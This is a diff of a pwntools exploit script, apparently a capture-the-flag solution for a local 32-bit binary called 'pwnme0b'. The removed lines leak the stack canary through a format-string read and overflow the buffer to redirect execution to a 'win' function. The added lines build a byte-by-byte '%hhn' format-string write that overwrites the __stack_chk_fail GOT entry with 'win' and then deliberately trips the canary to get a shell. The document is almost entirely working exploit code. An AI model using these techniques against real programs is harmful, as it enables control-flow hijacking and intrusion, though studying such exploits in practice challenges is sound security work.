@@ -1,31 +1,32 @@
 from pwn import *
 
-context.arch = "i386"
-elf = ELF("./pwnme0b")
+e = ELF('./pwnme0b')
+context.binary = e
+context.arch = 'i386'
+context.log_level = 'warn'
 
-# --- Run 1: leak canary ---
-b = process("./pwnme0b")
-b.recvuntil(b"WWW\n")
-b.sendline(b"%35$08x")   # canary is at offset 35
-b.sendline(b"AAAA")
-output = b.recvall(timeout=2)
-canary = int(output.strip().split(b"\n")[-1].strip(), 16)
-log.info(f"Leaked canary: {hex(canary)}")
-b.close()
+win = e.symbols['win']
+ssf_got = e.got['__stack_chk_fail']
+log.warn(f"win={hex(win)} __stack_chk_fail@got={hex(ssf_got)}")
 
-# --- Run 2: use canary to get shell ---
-b = process("./pwnme0b")
-b.recvuntil(b"WWW\n")
+# Byte-by-byte FSV payload: write low->high byte of &win into ssf_got.
+addrs = b''.join(p32(ssf_got + i) for i in range(4))
+bytes_to_write = [(win >> (8*i)) & 0xff for i in range(4)]
+fmt = b''
+written = 16
+arg = 10
+for b in bytes_to_write:
+    diff = (b - (written & 0xff)) & 0xff
+    if diff == 0:
+        diff = 256
+    fmt += f"%{diff}c%{arg}$hhn".encode()
+    written += diff
+    arg += 1
+payload = addrs + fmt
+assert len(payload) <= 99
 
-win_addr = elf.symbols['win']
-
-b.sendline(b"AAAA")    # input 1 (buf1) - dummy
-
-payload  = b'A' * 0x74      # padding to canary
-payload += p32(canary)      # restore canary
-payload += p32(0)           # saved EBX
-payload += p32(0)           # saved EBP
-payload += p32(win_addr)    # overwrite EIP
-b.sendline(payload)
-
-b.interactive()
+io = process('./pwnme0b')
+io.recvline()
+io.sendline(payload)
+io.sendline(b'A' * 200)
+io.interactive()
